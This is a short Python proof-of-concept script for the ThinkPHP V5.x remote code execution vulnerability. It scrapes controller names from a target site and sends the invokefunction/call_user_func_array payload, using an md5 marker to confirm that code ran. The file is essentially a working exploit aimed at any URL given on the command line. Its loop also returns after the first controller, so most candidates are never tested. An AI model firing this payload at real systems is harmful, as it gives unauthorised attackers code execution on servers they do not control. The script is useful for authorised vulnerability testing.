#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ThinkPHP V5.x远程代码执行漏洞
referer: https://iaq.pw/archives/106
author: Lucifer
description: ThinkPHP V5.x代码执行漏洞
'''
import re
import sys
import requests
import warnings
def extract_controller(url):
    try:
        urls = list()
        req = requests.get(url, timeout=10, verify=False)
        pattern = '<a[\\s+]href="/[A-Za-z]+'
        matches = re.findall(pattern, req.text)
        for match in matches:
            urls.append(match.split('/')[1])
        urls = list(set(urls))
        urls.append('index')
        return urls
    except:
        return ''

def run(url):
    result= ['ThinkPHP V5.x远程代码执行漏洞','','']
    controllers = extract_controller(url)
    if controllers !='':
        for controller in controllers:
            payload = "/?s={}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=123".format(controller)
            vulnurl = url + payload
            try:
                req = requests.get(vulnurl, timeout=10, verify=False)
                if r"202cb962ac59075b964b07152d234b70" in req.text:
                    result[2]="存在"
                    result[1]=vulnurl
                    return result
                else:
                    result[2]="不存在"
            except:
                result[2] = "不存在"
            return result
    else:
        result[2] = "不存在"
        return result


if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    